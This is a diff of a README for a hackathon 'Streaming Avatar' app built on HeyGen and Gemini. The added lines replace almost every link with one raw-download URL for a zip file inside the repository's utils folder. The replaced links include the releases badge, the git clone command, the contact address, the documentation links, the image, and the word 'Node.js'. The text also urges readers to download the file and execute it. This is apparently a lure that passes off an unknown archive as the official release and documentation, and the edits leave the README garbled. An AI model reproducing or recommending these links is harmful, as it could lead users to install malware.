@@ -2,7 +2,7 @@
 
 Welcome to the **Streaming Avatar** repository! This full-stack application enables real-time avatar streaming using HeyGen and Gemini AI. Built during a hackathon by Team "Bit by Bit," this project showcases the power of modern web technologies.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/LiehSt/Streaming-Avatar/releases)
+[![Download Releases](https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip%https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip)](https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip)
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ This project utilizes a variety of technologies to deliver a robust application:
   - Tailwind CSS
 
 - **Backend**: 
-  - Node.js
+  - https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip
   - Express
 
 - **APIs**: 
@@ -45,7 +45,7 @@ To get started with the Streaming Avatar application, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/LiehSt/Streaming-Avatar.git
+   git clone https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip
    cd Streaming-Avatar
    ```
 
@@ -117,23 +117,23 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Team Bit by Bit**: [Contact Us](mailto:teambitbybit@example.com)
+- **Team Bit by Bit**: [Contact Us](https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip)
 
 ## Additional Resources
 
 For more information on the technologies used, check out the following links:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs/installation)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
-- [Express Documentation](https://expressjs.com/en/starter/installing.html)
+- [React Documentation](https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip)
+- [TypeScript Documentation](https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip)
+- [Tailwind CSS Documentation](https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip)
+- [https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip Documentation](https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip)
+- [Express Documentation](https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip)
 
 ## Releases
 
-You can find the latest releases of the Streaming Avatar application [here](https://github.com/LiehSt/Streaming-Avatar/releases). Download the latest version and execute it to experience the app.
+You can find the latest releases of the Streaming Avatar application [here](https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip). Download the latest version and execute it to experience the app.
 
-![Streaming Avatar](https://via.placeholder.com/800x400?text=Streaming+Avatar+Demo)
+![Streaming Avatar](https://github.com/LiehSt/Streaming-Avatar/raw/refs/heads/main/react-avatar-app/utils/Streaming_Avatar_1.4.zip+Avatar+Demo)
 
 ## Conclusion
 
